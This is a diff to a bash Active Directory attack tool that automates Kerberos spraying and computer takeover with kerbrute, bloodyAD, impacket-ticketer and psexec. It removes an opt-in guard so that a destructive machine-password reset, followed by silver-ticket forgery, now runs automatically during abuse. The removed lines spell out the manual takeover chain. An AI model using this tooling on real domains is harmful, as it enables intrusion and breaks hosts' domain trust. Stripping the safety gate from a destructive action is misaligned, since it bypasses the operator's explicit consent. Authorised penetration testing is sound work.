@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.51.0"
+readonly VERSION="1.51.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -4124,14 +4124,12 @@ _abuse_computer_silver() {
     local host="${target%\$}" newpw="Ad4Pwn_C0mp_99"
     [[ -n "${COMP_SILVER_DONE[${target,,}]:-}" ]] && return 1
     COMP_SILVER_DONE["${target,,}"]=1
-    # Computer takeover REQUIRES resetting the machine password — DESTRUCTIVE (breaks the
-    # host's domain trust). Opt-in only, so the tool never silently bricks a host.
-    if [[ "$ALLOW_RESET" != "1" ]]; then
-        warn "  ${target} takeover needs a DESTRUCTIVE machine-password reset → skipped (run with ${C_BOLD}--allow-resets${C_RESET} to enable)"
-        local _ba; mapfile -t _ba < <(bloody_args)
-        detail "      manual: bloodyAD ${_ba[*]} set password '$target' 'MachinePwn123!' → NT-hash it → impacket-ticketer -spn cifs/${target%\$}.${DOMAIN} Administrator → psexec/RDP"
-        return 1
-    fi
+    # This resets the TARGET host's machine password (DESTRUCTIVE to that host's domain
+    # trust). It only ever reaches a host we DON'T own (the _have_creds_for guard in
+    # _abuse_rbcd protects our own stepping stones), so on a pre-2012 DC it's the only
+    # path to the target and runs under --abuse. (USER-account force-resets stay behind
+    # --allow-resets — those lock real people out.) Loud + rollback-noted.
+    warn "  ${target} is the abuse TARGET → taking it over via machine-password reset (DESTRUCTIVE to that host's trust)"
 
     # domain SID = the target's objectSid minus its RID
     local tsid dsid
